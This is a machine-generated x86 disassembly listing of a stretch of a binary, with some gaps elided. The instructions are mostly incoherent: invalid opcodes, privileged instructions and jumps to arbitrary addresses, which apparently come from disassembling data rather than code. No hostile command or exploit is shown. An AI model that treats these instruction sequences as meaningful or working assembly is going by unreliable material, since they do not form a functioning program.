  41c5a4:	mov    cl,0xf
  41c5a6:	arpl   WORD PTR [ebx],bp
  41c5a8:	add    DWORD PTR [eax],eax
  41c5aa:	pop    es
  41c5ab:	add    DWORD PTR [eax],eax
  41c5ad:	add    BYTE PTR [ecx+ebx*4+0x270f372e],dh
  41c5b4:	xor    eax,DWORD PTR [esi-0x6197b6c]
  41c5ba:	add    bl,BYTE PTR [edi-0x63864987]
  41c5c0:	cmp    esp,edi
  41c5c2:	jp     0x41c54d
  41c5c4:	push   esi
  41c5c5:	clc    
  41c5c6:	rcl    BYTE PTR [esi+0x76],1
  41c5c9:	pop    ds
  41c5ca:	xchg   edi,eax
  41c5cb:	jb     0x41c5bd
  41c5cd:	ins    BYTE PTR es:[edi],dx
  41c5ce:	in     eax,dx
  41c5cf:	jbe    0x41c62d
  41c5d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5d2:	fnclex 
  41c5d4:	push   edx
  41c5d5:	leave  
  41c5d6:	push   ebx
  41c5d7:	jge    0x41c55f
  41c5d9:	call   0x3de35439
  41c5de:	mov    WORD PTR [edx],cs
  41c5e0:	imul   ebx,DWORD PTR [edx+0x6b],0xffffffe2
  41c5e4:	and    dh,BYTE PTR [esi]
  41c5e6:	or     DWORD PTR [edx+0x170c475d],esi
  41c5ec:	jne    0x41c64a
  41c5ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5ef:	mov    eax,0xa00dbe95
  41c5f4:	pop    ebp
  41c5f5:	les    esi,FWORD PTR [eax-0x10bd8060]
  41c5fb:	sbb    BYTE PTR [edi-0x60971f32],dl
  41c601:	test   eax,0x5327c6c5
  41c606:	pop    esp
  41c607:	popf   
  41c608:	xchg   ch,bh
  41c60a:	daa    
  41c60b:	pop    ss
  41c60c:	cmp    cl,BYTE PTR [edx+ebp*4+0x1a58403b]
  41c613:	js     0x41c667
  41c615:	sbb    BYTE PTR [esi],bh
  41c617:	push   eax
  41c618:	int    0xae
  41c61a:	mov    gs,WORD PTR [ebp+0x33]
  41c61d:	test   bl,dh
  41c61f:	fild   DWORD PTR [ebx+0x5b01729f]
  41c625:	lods   al,BYTE PTR ds:[esi]
  41c626:	arpl   WORD PTR [edi+0x2fe5ccbc],sp
  41c62c:	(bad)  [edi]
  41c62e:	sar    edi,1
  41c630:	sbb    esp,0x6ab281ca
  41c636:	aam    0x57
  41c638:	iret   
  41c639:	pop    es
  41c63a:	test   DWORD PTR [eax],ebp
  41c63c:	repnz sub dl,dh
  41c63f:	cwde   
  41c640:	jge    0x41c693
  41c642:	cwde   
  41c643:	mov    WORD PTR [ecx],fs
  41c645:	in     al,dx
  41c646:	pop    es
  41c647:	sub    edx,DWORD PTR es:[ebp-0x4d631b08]
  41c64e:	shl    BYTE PTR [edi+0x9],0xb
  41c652:	fld    TBYTE PTR [ecx]
  41c654:	in     eax,dx
  41c655:	rcr    cl,cl
  41c657:	sub    BYTE PTR [edx],ah
  41c659:	sahf   
  41c65a:	aam    0x59
  41c65c:	cmp    al,0x29
  41c65e:	push   0x21
  41c660:	loopne 0x41c604
  41c662:	fistp  WORD PTR [ebx+0x4a606ae0]
  41c668:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c669:	call   edi
  41c66b:	dec    esi
  41c66c:	inc    esi
  41c66d:	sbb    esi,DWORD PTR [eax+0x8]
  41c670:	outs   dx,BYTE PTR ds:[esi]
  41c671:	cwde   
  41c672:	hlt    
  41c673:	mov    bh,0x9d
  41c675:	rcl    DWORD PTR [edi-0x57],1
  41c678:	and    BYTE PTR [eax+ecx*1+0x1c],ah
  41c67c:	jbe    0x41c692
  41c67e:	mov    al,bl
  41c680:	loopne 0x41c6a9
  41c682:	sub    DWORD PTR [ebx],0x15
  41c685:	jge    0x41c6a6
  41c687:	adc    cl,BYTE PTR [ebp+0x12]
  41c68a:	fs out 0xf7,eax
  41c68d:	mov    cl,0xb0
  41c68f:	not    DWORD PTR [ebp-0x50]
  41c692:	retf   
  41c693:	cli    
  41c694:	pop    esi
  41c695:	popf   
  41c696:	xor    DWORD PTR [eax+ecx*8],ebx
  41c699:	mov    esi,ebp
  41c69b:	cs mov bh,0xfa
  41c69e:	inc    ebx
  41c69f:	xchg   esp,eax
  41c6a0:	push   esp
  41c6a1:	test   bl,ch
  41c6a3:	inc    ebp
  41c6a4:	cmc    
  41c6a5:	mov    DWORD PTR [eax-0xdabe102],eax
  41c6ab:	or     eax,0x8f3dc7c0
  41c6b0:	pop    esi
  41c6b1:	mov    ebx,0x986e2f
	...
  41c716:	fiadd  DWORD PTR [ecx]
  41c718:	ret    0xdb86
  41c71b:	(bad)  
  41c71c:	ficomp WORD PTR [ebp+0x7e]
  41c71f:	cmp    BYTE PTR [ecx+0x13],dh
  41c722:	sub    BYTE PTR [edi],al
  41c724:	jo     0x41c756
  41c726:	push   0x2c
  41c728:	add    DWORD PTR [eax],eax
  41c72a:	pop    es
  41c72b:	add    DWORD PTR [eax],eax
  41c72d:	add    BYTE PTR [ebx],dh
  41c72f:	or     ecx,DWORD PTR [ebp-0x76]
  41c732:	push   esi
  41c733:	hlt    
  41c734:	rcr    cl,1
  41c736:	and    eax,DWORD PTR [eax]
  41c738:	dec    ecx
  41c739:	xchg   esp,eax
  41c73a:	ss mul ch
  41c73d:	push   esp
  41c73e:	leave  
  41c73f:	push   ecx
  41c740:	add    dh,ch
  41c742:	sahf   
  41c743:	les    ecx,FWORD PTR [ecx+eax*8-0x72]
  41c747:	add    esp,DWORD PTR [eax+0x33a2e0f9]
  41c74d:	mov    eax,ds:0x189a96df
  41c752:	mov    bh,BYTE PTR [ecx+0x2b]
  41c755:	ja     0x41c7c8
  41c757:	out    0xde,al
  41c759:	fmul   QWORD PTR [ecx-0x29cbdd8a]
  41c75f:	pop    ss
  41c760:	xor    cl,BYTE PTR [eax-0x80]
  41c763:	xor    DWORD PTR [ecx],ebx
  41c765:	mov    ebx,0xb2e23dc4
  41c76a:	cmp    esi,edi
  41c76c:	adc    eax,0x54518823
  41c771:	std    
  41c772:	adc    ebp,DWORD PTR [eax]
  41c774:	push   esp
  41c775:	cmp    ecx,ebp
  41c777:	retf   0xe400
  41c77a:	pop    DWORD PTR [eax+0x3]
  41c77d:	dec    ecx
  41c77e:	sbb    ecx,edi
  41c780:	and    BYTE PTR [edx],dl
  41c782:	cmc    
  41c783:	mov    dl,0xf4
  41c785:	jp     0x41c713
  41c787:	mov    bh,0xc4
  41c789:	retf   0x782c
  41c78c:	xor    edi,DWORD PTR [ebx+0x31]
  41c78f:	(bad)  
  41c790:	pop    ebp
  41c791:	dec    ebx
  41c792:	mov    ch,0x3f
  41c794:	push   edx
  41c795:	adc    al,0x3
  41c797:	sbb    ah,BYTE PTR [edi-0x291bec4]
  41c79d:	mov    dl,0xb7
  41c79f:	lods   eax,DWORD PTR ds:[esi]
  41c7a0:	mov    cl,BYTE PTR [edx+0x50]
  41c7a3:	dec    eax
  41c7a4:	dec    ebp
  41c7a5:	shl    BYTE PTR [edi],1
  41c7a7:	bound  ecx,QWORD PTR [eax-0x63]
  41c7aa:	repz jmp 0x41c799
  41c7ad:	push   esi
  41c7ae:	bound  eax,QWORD PTR [edi]
  41c7b0:	pop    ebx
  41c7b1:	daa    
  41c7b2:	(bad)  
  41c7b3:	xor    DWORD PTR ds:0xedb6a4f0,esp
  41c7b9:	call   FWORD PTR [ecx+0x30e9c81]
  41c7bf:	sbb    ebp,DWORD PTR [esi+0x78]
  41c7c2:	xor    edx,DWORD PTR [edx]
  41c7c4:	xchg   esp,eax
  41c7c5:	leave  
  41c7c6:	data16 or bh,al
  41c7c9:	outs   dx,DWORD PTR ds:[esi]
  41c7ca:	gs push ss
  41c7cc:	jle    0x41c82d
  41c7ce:	adc    BYTE PTR [eax+0x4b],al
  41c7d1:	test   esi,esp
  41c7d3:	jl     0x41c842
  41c7d5:	dec    esp
  41c7d6:	mov    edx,0x3cdd13fb
  41c7db:	jl     0x41c7f9
  41c7dd:	enter  0xd60f,0xbd
  41c7e1:	and    al,0x35
  41c7e3:	xchg   BYTE PTR [edi-0x49],al
  41c7e6:	xor    BYTE PTR [edi+0x7335802],dh
  41c7ec:	xor    eax,0x7f495e0c
  41c7f1:	mov    al,ds:0x9a660769
  41c7f6:	xchg   edi,eax
  41c7f7:	popf   
  41c7f8:	leave  
  41c7f9:	cmp    al,0xa9
  41c7fb:	adc    al,0x92
  41c7fd:	sub    dl,al
  41c7ff:	mov    dh,cl
  41c801:	inc    ebx
  41c802:	icebp  
  41c803:	mov    ebp,esp
  41c805:	pop    edx
  41c806:	mov    dh,0xc2
  41c808:	add    BYTE PTR [edi+edx*1],al
  41c80b:	inc    ebx
  41c80c:	cld    
  41c80d:	pop    ebx
  41c80e:	push   es
  41c80f:	sbb    al,0x59
  41c811:	das    
  41c812:	sub    dh,bl
  41c814:	cmp    eax,0xcf098d69
  41c819:	sub    edx,esi
  41c81b:	hlt    
  41c81c:	leave  
  41c81d:	adc    DWORD PTR [ecx+0x372e50ca],0xffffffa0
  41c824:	mov    bh,0x69
  41c826:	mov    bl,0x3
  41c828:	jbe    0x41c7af
  41c82a:	sbb    eax,0x4c6f0ee5
  41c82f:	iret   
  41c830:	push   ds
  41c831:	jle    0x41c7f6
  41c833:	push   esp
  41c834:	cmp    al,0x0
	...
  41c896:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41c89d:	ja     0x41c8c2
  41c89f:	cs js  0x41c910
  41c8a2:	(bad)  
  41c8a3:	call   0x1:0x2d71a256
  41c8aa:	pop    es
  41c8ab:	add    DWORD PTR [eax],eax
  41c8ad:	add    dl,bh
  41c8af:	sahf   
  41c8b0:	xchg   edi,eax
  41c8b1:	xor    BYTE PTR [edi+0x76],ah
  41c8b4:	inc    ebx
  41c8b5:	push   ecx
  41c8b6:	das    
  41c8b7:	or     edx,DWORD PTR [esi-0x4f06c481]
  41c8bd:	inc    ebx
  41c8be:	call   DWORD PTR [edi+0x7a]
  41c8c1:	in     al,0x39
  41c8c3:	fwait
  41c8c4:	inc    edx
  41c8c5:	aas    
  41c8c6:	xor    eax,DWORD PTR [ecx]
  41c8c8:	enter  0x5b36,0x48
  41c8cc:	icebp  
  41c8cd:	fwait
  41c8ce:	aas    
  41c8cf:	push   eax
  41c8d0:	push   cs
  41c8d1:	mov    eax,0x21a68cac
  41c8d6:	xor    eax,0x3a509f55
  41c8db:	jb     0x41c8e6
  41c8dd:	push   es
  41c8de:	mov    WORD PTR [ebx+0x5538a1c7],es
  41c8e4:	push   es
  41c8e5:	sbb    al,0x10
  41c8e7:	ss out 0xdb,eax
  41c8ea:	stos   DWORD PTR es:[edi],eax
  41c8eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8ec:	inc    ecx
  41c8ed:	aad    0x41
  41c8ef:	icebp  
  41c8f0:	fsub   DWORD PTR [esi+0x18]
  41c8f3:	sbb    DWORD PTR [ebp+0x557eb8dc],esp
  41c8f9:	add    BYTE PTR [eax],ah
  41c8fb:	jns    0x41c957
  41c8fd:	sbb    al,0x2b
  41c8ff:	loop   0x41c8ac
  41c901:	(bad)  
  41c902:	xor    ecx,ebp
  41c904:	jl     0x41c912
  41c906:	imul   ebp,edx,0x71
  41c909:	jb     0x41c974
  41c90b:	lods   al,BYTE PTR ds:[esi]
  41c90c:	imul   ch
  41c90e:	xchg   ebx,eax
  41c90f:	cmp    ch,al
  41c911:	sub    bl,ch
  41c913:	pop    esi
  41c914:	sbb    ebx,DWORD PTR [ebp-0x78ba230b]
  41c91a:	mov    esp,0xfb0e8c19
  41c91f:	xchg   ebp,eax
  41c920:	ret    0x6c05
  41c923:	in     eax,dx
  41c924:	pop    esi
  41c925:	cld    
  41c926:	aaa    
  41c927:	add    dh,BYTE PTR [ebp+0x15]
  41c92a:	inc    esp
  41c92b:	cmp    ch,cl
  41c92d:	xchg   edx,eax
  41c92e:	and    al,0x47
  41c930:	test   DWORD PTR [esi+0x7c],esi
  41c933:	inc    esi
  41c934:	ins    DWORD PTR es:[edi],dx
  41c935:	xchg   bl,bh
  41c937:	add    BYTE PTR ds:0x43221696,bh
  41c93d:	push   ecx
  41c93e:	arpl   WORD PTR [edx+0x6c],si
  41c941:	ror    bh,cl
  41c943:	jb     0x41c92a
  41c945:	push   edx
  41c946:	and    BYTE PTR [edi+0x2e7989a2],0xab
  41c94d:	push   ebx
  41c94e:	pop    esp
  41c94f:	add    bh,al
  41c951:	test   DWORD PTR [edx-0x7c623e45],edi
  41c957:	push   esi
  41c958:	adc    al,0xad
  41c95a:	inc    edx
  41c95b:	jo     0x41c8e1
  41c95d:	sti    
  41c95e:	imul   esi,DWORD PTR [ebx-0x5b],0x1d
  41c962:	js     0x41c9c7
  41c964:	mov    BYTE PTR [edx-0x21],bh
  41c967:	popf   
  41c968:	or     al,0x8
  41c96a:	scas   al,BYTE PTR es:[edi]
  41c96b:	mov    ds:0xd3d40b2b,al
  41c970:	cmp    eax,DWORD PTR [esi]
  41c972:	inc    ebp
  41c973:	add    eax,0xc5cafcae
  41c978:	cmp    al,0xa5
  41c97a:	into   
  41c97b:	push   esi
  41c97c:	mov    edi,0x12ec5fd6
  41c981:	xor    al,0x54
  41c983:	dec    edi
  41c984:	inc    eax
  41c985:	dec    ebx
  41c986:	and    DWORD PTR [edi+edx*2-0x31],0x77
  41c98b:	fbstp  TBYTE PTR [ebx]
  41c98d:	jle    0x41c917
  41c98f:	scas   al,BYTE PTR es:[edi]
  41c990:	sub    DWORD PTR [ebx-0x5cc71ba4],ecx
  41c996:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c997:	inc    edx
  41c998:	lds    ecx,FWORD PTR [edi-0x27658316]
  41c99e:	dec    ecx
  41c99f:	jg     0x41ca00
  41c9a1:	add    eax,DWORD PTR [edi-0x3aadef4b]
  41c9a7:	stos   DWORD PTR es:[edi],eax
  41c9a8:	inc    edx
  41c9a9:	cmc    
  41c9aa:	(bad)  
  41c9ac:	outs   dx,DWORD PTR ds:[esi]
  41c9ad:	cmp    cx,WORD PTR [eax+0x11bf1b28]
  41c9b4:	dec    esi
	...
  41ca15:	add    al,dh
  41ca17:	retf   0xfc94
  41ca1a:	mov    esi,0x1bcef8fe
  41ca1f:	sub    al,bl
  41ca21:	test   eax,0x92e3e451
  41ca26:	js     0x41ca56
  41ca28:	add    DWORD PTR [eax],eax
  41ca2a:	pop    es
  41ca2b:	add    DWORD PTR [eax],eax
  41ca2d:	add    BYTE PTR [esi+eax*2+0x3cfa6ac8],al
  41ca34:	or     al,0x18
  41ca36:	adc    eax,0xe5e2e684
  41ca3b:	xsaves [esi-0x91afc1d]
  41ca42:	push   ds
  41ca43:	or     DWORD PTR [edx],0xcb1c3ddf
  41ca49:	lods   eax,DWORD PTR ds:[esi]
  41ca4a:	cmp    ecx,ebx
  41ca4c:	mov    ch,0xe7
  41ca4e:	and    edi,DWORD PTR [esi]
  41ca50:	imul   BYTE PTR [ebx+eax*4+0x6e8b461c]
  41ca57:	jecxz  0x41ca06
  41ca59:	add    DWORD PTR ds:0x1628440,edx
  41ca5f:	inc    ebp
  41ca60:	sbb    BYTE PTR [ecx],al
  41ca62:	jmp    0xa2b0:0x1d328470
  41ca69:	jo     0x41cad8
  41ca6b:	(bad)  
  41ca6c:	js     0x41c9fb
  41ca6e:	mov    dh,0xaf
  41ca70:	jl     0x41ca95
  41ca72:	ret    
  41ca73:	add    BYTE PTR [ecx],0x29
  41ca76:	nop
  41ca77:	test   cl,bh
  41ca79:	xor    dl,dh
  41ca7b:	xchg   ebx,eax
  41ca7c:	jmp    0x60e3b7f8
  41ca81:	ret    0xbd06
  41ca84:	ja     0x41ca53
  41ca86:	(bad)  
  41ca87:	aad    0x8d
  41ca89:	jp     0x41ca34
  41ca8b:	adc    ecx,ebx
  41ca8d:	push   0xffffff81
  41ca8f:	adc    eax,0x451156ca
  41ca94:	or     DWORD PTR [ecx+0x4f],ebx
  41ca97:	(bad)  
  41ca98:	js     0x41ca79
  41ca9a:	xor    bh,BYTE PTR [ebx+ebx*2+0x59]
  41ca9e:	mov    esp,0xd8651317
  41caa3:	xor    ch,BYTE PTR [edx-0x5a]
  41caa6:	push   edx
  41caa7:	add    eax,0x5716d38a
  41caac:	aam    0x2a
  41caae:	test   eax,0x1b378002
  41cab3:	dec    DWORD PTR [esi+0x4e]
  41cab6:	jmp    0x9740:0x1a77c441
  41cabd:	add    al,BYTE PTR [edi+0x1f]
  41cac0:	out    dx,al
  41cac1:	rcr    BYTE PTR [esi+0x99bd041],1
  41cac7:	cmp    ebp,DWORD PTR [ebx-0x62]
  41caca:	(bad)  
  41cacb:	fs add al,0xe
  41cace:	outs   dx,DWORD PTR ds:[esi]
  41cacf:	push   0x5c9e3ecc
  41cad4:	sbb    bl,BYTE PTR [edi+eiz*8-0x2da3ed48]
  41cadb:	jmp    0xd03b:0x68d5cd7d
  41cae2:	mov    esi,0x86be802e
  41cae7:	call   0x95638fe4
  41caec:	stc    
  41caed:	jmp    DWORD PTR [ebx+0x4c]
  41caf0:	dec    ebx
  41caf1:	xchg   BYTE PTR ds:0x34cb8e21,bl
  41caf7:	jo     0x41caa0
  41caf9:	mov    al,ds:0xa6ad6a8d
  41cafe:	paddusw mm1,QWORD PTR [eax-0x49]
  41cb02:	mul    DWORD PTR [edi]
  41cb04:	ds lahf 
  41cb06:	pop    ss
  41cb07:	lds    eax,FWORD PTR [edi+0x2cbce35d]
  41cb0d:	fstp   DWORD PTR [ebx+0x71]
  41cb10:	sar    BYTE PTR [ebx+0x4b63f691],0x66
  41cb17:	pop    ecx
  41cb18:	or     DWORD PTR [ecx],esp
  41cb1a:	cli    
  41cb1b:	inc    ebx
  41cb1c:	les    ebp,FWORD PTR [eax+0x33]
  41cb1f:	fwait
  41cb20:	jmp    0x8ea8:0xd231a246
  41cb27:	inc    edx
  41cb28:	outs   dx,BYTE PTR ds:[esi]
  41cb29:	ret    
  41cb2a:	es xchg edx,eax
  41cb2c:	mov    esp,0x912846a3
  41cb31:	jne    0x41cab7
  41cb33:	icebp  
  41cb34:	xchg   edi,eax
	...
  41cb95:	add    BYTE PTR [ecx],ch
  41cb97:	(bad)  
  41cb98:	sti    
  41cb99:	pop    ebp
  41cb9a:	(bad)  
  41cb9b:	jge    0x41cb4c
  41cb9d:	div    BYTE PTR [esi-0xc3dc3b4]
  41cba3:	adc    ah,BYTE PTR [edi]
  41cba5:	adc    eax,0x12f7f
  41cbaa:	pop    es
  41cbab:	add    DWORD PTR [eax],eax
  41cbad:	add    dh,ah
  41cbaf:	cdq    
  41cbb0:	(bad)  
  41cbb1:	pop    eax
  41cbb2:	dec    ebp
  41cbb3:	popa   
  41cbb4:	push   0x199459ca
  41cbb9:	push   cs
  41cbba:	sti    
  41cbbb:	sbb    BYTE PTR [edx+0x469ba466],bh
  41cbc1:	inc    eax
  41cbc2:	mov    eax,ds:0x411ec4c6
  41cbc7:	std    
  41cbc8:	enter  0x6c5b,0x34
  41cbcc:	lods   al,BYTE PTR ds:[esi]
  41cbcd:	addr16 pop ss
  41cbcf:	(bad)
  41cbd2:	iret   
  41cbd3:	pop    edi
  41cbd4:	jbe    0x41cbd7
  41cbd6:	dec    edx
  41cbd7:	jmp    0x28d3a734
  41cbdc:	cmp    BYTE PTR [esi],bl
  41cbde:	mov    ebp,0xf5f58e07
  41cbe3:	lods   eax,DWORD PTR ds:[esi]
  41cbe4:	adc    ebp,ebx
  41cbe6:	mov    ebx,0xf7639b1e
  41cbeb:	xchg   ebp,eax
  41cbec:	jge    0x41cc46
  41cbee:	cwde   
  41cbef:	aaa    
  41cbf0:	int3   
  41cbf1:	pop    ebp
  41cbf2:	sbb    eax,0x7c1548c8
  41cbf7:	std    
  41cbf8:	inc    eax
  41cbf9:	push   0xe98d158c
  41cbfe:	aad    0x27
  41cc00:	loopne 0x41cbe5
  41cc02:	xor    eax,0xb127cdf4
  41cc07:	xor    BYTE PTR [edx+ebx*8+0x3e],bh
  41cc0b:	or     BYTE PTR [edx-0x3a],al
  41cc0e:	icebp  
  41cc0f:	mov    esi,esi
  41cc11:	xor    dl,cl
  41cc13:	neg    DWORD PTR [edx+esi*1]
  41cc16:	lods   al,BYTE PTR ds:[esi]
  41cc17:	mov    BYTE PTR [esi],0x3e
  41cc1a:	xor    eax,0x88391d3b
  41cc1f:	jbe    0x41cbd9
  41cc21:	inc    ebp
  41cc22:	aad    0xa1
  41cc24:	jns    0x41cbba
  41cc26:	adc    al,0x96
  41cc28:	sbb    BYTE PTR [ebp+0x57404d11],dh
  41cc2e:	aas    
  41cc2f:	add    ah,BYTE PTR [eax-0xd]
  41cc32:	loope  0x41cbc7
  41cc34:	xchg   ebp,eax
  41cc35:	mov    WORD PTR [ecx],ss
  41cc37:	add    eax,0x7478d0e6
  41cc3c:	or     al,0x71
  41cc3e:	cmp    eax,0xf9267ab5
  41cc43:	pop    edi
  41cc44:	adc    BYTE PTR [edx],cl
  41cc46:	xlat   BYTE PTR ds:[ebx]
  41cc47:	dec    ebx
  41cc48:	push   0xf9515920
  41cc4d:	sub    al,0x36
  41cc4f:	nop
  41cc50:	xor    al,0x93
  41cc52:	sub    edi,eax
  41cc54:	inc    ebx
  41cc55:	push   0xffffffab
  41cc57:	mov    al,ds:0x7ef28509
  41cc5c:	into   
  41cc5d:	and    ah,BYTE PTR [esi+ebx*2-0xb4ab470]
  41cc64:	leave  
  41cc65:	xchg   dl,bh
  41cc67:	inc    esp
  41cc68:	call   0xd9070183
  41cc6d:	jo     0x41cc56
  41cc6f:	ss retf 
  41cc71:	aad    0x68
  41cc73:	sbb    edx,ebp
  41cc75:	icebp  
  41cc76:	out    dx,eax
  41cc77:	push   ecx
  41cc78:	(bad)  
  41cc79:	adc    bl,BYTE PTR [eax-0x69bc04bd]
  41cc7f:	mov    bl,0x76
  41cc81:	add    eax,0x3116f428
  41cc86:	jp     0x41cc75
  41cc88:	in     eax,0x6c
  41cc8a:	push   edi
  41cc8b:	fstp   TBYTE PTR [esi]
  41cc8d:	sub    DWORD PTR [ecx-0x222a4edb],edi
  41cc93:	sub    bh,ch
  41cc95:	dec    esp
  41cc96:	cmp    DWORD PTR [edi-0x6f6be8fd],ebx
  41cc9c:	or     edi,DWORD PTR [ebp+0x46]
  41cc9f:	mov    BYTE PTR [ecx+edx*1],bh
  41cca2:	call   0x4f9dcbe8
  41cca7:	inc    esp
  41cca8:	rol    BYTE PTR [edi+0x66cee130],cl
  41ccae:	jne    0x41cce5
  41ccb0:	push   0xf1337ec9
	...
  41cd15:	add    BYTE PTR [eax-0x67],ah
  41cd18:	fsubr  st(5),st
  41cd1a:	std    
  41cd1b:	in     eax,0x79
  41cd1d:	popf   
  41cd1e:	dec    ebx
  41cd1f:	int    0x76
  41cd21:	hlt    
  41cd22:	pop    eax
  41cd23:	xchg   BYTE PTR [edx-0x10],ch
  41cd26:	xchg   BYTE PTR [eax],dh
  41cd28:	add    DWORD PTR [eax],eax
  41cd2a:	pop    es
  41cd2b:	add    DWORD PTR [eax],eax
  41cd2d:	add    BYTE PTR [edi],dh
  41cd2f:	push   ds
  41cd30:	mov    dl,0xd3
  41cd32:	cdq    
  41cd33:	sbb    ecx,ebx
  41cd35:	arpl   WORD PTR [ebx+0x3a],di
  41cd38:	mov    eax,ds:0xcd4b51e4
  41cd3d:	aas    
  41cd3e:	test   DWORD PTR [edx-0x51a042f5],esi
  41cd44:	aas    
  41cd45:	iret   
  41cd46:	scas   eax,DWORD PTR es:[edi]
  41cd47:	jp     0x41cd69
  41cd49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd4a:	mov    ch,0xf8
  41cd4c:	in     al,dx
  41cd4d:	dec    ebp
  41cd4e:	xor    eax,0x563b2688
  41cd53:	popa   
  41cd54:	jg     0x41cd78
  41cd56:	adc    esp,DWORD PTR [eax+0x74]
  41cd59:	cwde   
  41cd5a:	and    eax,0x10da67b0
  41cd5f:	sbb    esi,esp
  41cd61:	ror    cl,cl
  41cd63:	jb     0x41cd74
  41cd65:	dec    esi
  41cd66:	mov    al,ds:0x544ec0a7
  41cd6b:	retf   0x87c2
  41cd6e:	mov    eax,ds:0xaa83bf25
  41cd73:	cld    
  41cd74:	mov    eax,ds:0x255bf9c0
  41cd79:	push   ss
  41cd7a:	pop    es
  41cd7b:	sbb    al,0x4d
  41cd7d:	dec    edi
  41cd7e:	sub    BYTE PTR [edx+0x42],ah
  41cd81:	int    0x22
  41cd83:	test   BYTE PTR [edx+0x52c64a82],0xee
  41cd8a:	jge    0x41cdd1
  41cd8c:	es pusha 
  41cd8e:	(bad)  
  41cd8f:	cmc    
  41cd90:	jle    0x41cdba
  41cd92:	or     al,0xb8
  41cd94:	inc    esi
  41cd95:	mov    ecx,DWORD PTR [ebp-0x35d8d725]
  41cd9b:	and    al,0x6f
  41cd9d:	std    
  41cd9e:	sub    al,0x9d
  41cda0:	fs stos BYTE PTR es:[edi],al
  41cda2:	lock retf 
  41cda4:	mov    bl,0x65
  41cda6:	(bad)  
  41cda7:	xchg   edi,eax
  41cda8:	mov    eax,ds:0x516a26d7
  41cdad:	pop    esp
  41cdae:	das    
  41cdaf:	xor    eax,0x78ec31ef
  41cdb4:	pop    ds
  41cdb5:	dec    esp
  41cdb6:	int    0x13
  41cdb8:	out    dx,al
  41cdb9:	cmc    
  41cdba:	jns    0x41ce35
  41cdbc:	mov    ecx,0xa58b6731
  41cdc1:	dec    ebp
  41cdc2:	ds push ds
  41cdc4:	sub    DWORD PTR [eax-0x29d65baf],esi
  41cdca:	add    al,0x98
  41cdcc:	(bad)  
  41cdcd:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdcf:	repnz push 0x9
  41cdd2:	dec    ebp
  41cdd3:	loope  0x41ce51
  41cdd5:	and    eax,0x1513e813
  41cdda:	into   
  41cddb:	ins    BYTE PTR es:[edi],dx
  41cddc:	hlt    
  41cddd:	test   eax,0x3eb33333
  41cde2:	test   DWORD PTR [ebx+ebx*1-0x13069ec5],edi
  41cde9:	adc    DWORD PTR [edi-0x5b],0x38d7f1cb
  41cdf0:	jmp    0x41cdab
  41cdf2:	mov    dl,0x45
  41cdf4:	fs pop eax
  41cdf6:	jl     0x41ce39
  41cdf8:	xlat   BYTE PTR ds:[ebx]
  41cdf9:	xchg   ebx,eax
  41cdfa:	mov    ah,0xa2
  41cdfc:	push   0x89cbf2be
  41ce01:	mov    ds:0x2ffe09aa,al
  41ce06:	pop    ss
  41ce07:	shl    bh,1
  41ce09:	lea    ebx,[ecx]
  41ce0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce0c:	push   eax
  41ce0d:	fsub   st(0),st
  41ce0f:	retf   
  41ce10:	adc    eax,DWORD PTR [eax-0x1bbb9c04]
  41ce16:	mov    ds:0xefc9008e,eax
  41ce1b:	mov    BYTE PTR [edx],dh
  41ce1d:	sub    DWORD PTR [esi-0x42df5129],esp
  41ce23:	dec    ecx
  41ce24:	retf   
  41ce25:	fiadd  WORD PTR [ebx]
  41ce27:	aaa    
  41ce28:	sub    ebx,DWORD PTR [ebp-0x368284aa]
  41ce2e:	inc    edi
  41ce2f:	mov    al,ds:0x16005721
  41ce34:	lods   al,BYTE PTR ds:[esi]
	...
  41ce95:	add    BYTE PTR [edi],al
  41ce97:	jp     0x41ce81
  41ce99:	jnp    0x41ce98
  41ce9b:	sti    
  41ce9c:	xchg   edi,eax
  41ce9d:	jle    0x41ce2e
  41ce9f:	imul   esp,DWORD PTR [edx+0x5b],0x2f6bffa8
  41cea6:	lea    esi,[ecx]
  41cea8:	add    DWORD PTR [eax],eax
  41ceaa:	pop    es
  41ceab:	add    DWORD PTR [eax],eax
  41cead:	add    BYTE PTR [eiz*8+0x7bf5a8b3],bl
  41ceb4:	and    DWORD PTR ss:[ecx],ebp
  41ceb7:	popf   
  41ceb8:	jns    0x41cec9
  41ceba:	xor    BYTE PTR [ebp-0x7d82bc73],0x4
  41cec1:	out    0xf7,al
  41cec3:	jbe    0x41cec7
  41cec5:	fdiv   QWORD PTR [ebp-0x28]
  41cec8:	add    DWORD PTR [ecx],esi
  41ceca:	in     al,dx
  41cecb:	push   esp
  41cecc:	neg    bl
  41cece:	mov    ebp,0x3a3830a5
  41ced3:	aas    
  41ced4:	adc    DWORD PTR [edi],ecx
  41ced6:	add    ebx,esp
  41ced8:	dec    DWORD PTR [edx+0x16b9cd55]
  41cede:	imul   edx,esi,0xffffffa0
  41cee1:	les    eax,FWORD PTR [edi]
  41cee3:	sbb    ch,BYTE PTR [ebp-0x126186f6]
  41cee9:	xchg   ebp,eax
  41ceea:	pop    edi
  41ceeb:	jnp    0x41ce8e
  41ceed:	ja     0x41cefb
  41ceef:	out    dx,eax
  41cef0:	shl    ebp,0x24
  41cef3:	bnd jge 0x41cef9
  41cef6:	lahf   
  41cef7:	shl    DWORD PTR [eax+0x44],0x52
  41cefb:	imul   edi,DWORD PTR [edi-0x216d51e4],0xa7a2e370
  41cf05:	ins    DWORD PTR es:[edi],dx
  41cf06:	add    ch,BYTE PTR [eax-0x7b]
  41cf09:	(bad)  
  41cf0a:	rcr    BYTE PTR [ebp-0x63],1
  41cf0d:	and    al,0x70
  41cf0f:	clc    
  41cf10:	jge    0x41cf16
  41cf12:	sbb    eax,0x5d92d257
  41cf17:	inc    esp
  41cf18:	enter  0x62c8,0xc6
  41cf1c:	int    0xeb
  41cf1e:	push   es
  41cf1f:	pop    ecx
  41cf20:	jl     0x41cf26
  41cf22:	mov    ecx,0xceb25e10
  41cf27:	cdq    
  41cf28:	jecxz  0x41cf2c
  41cf2a:	push   ecx
  41cf2b:	addr16 inc ebp
  41cf2d:	inc    esp
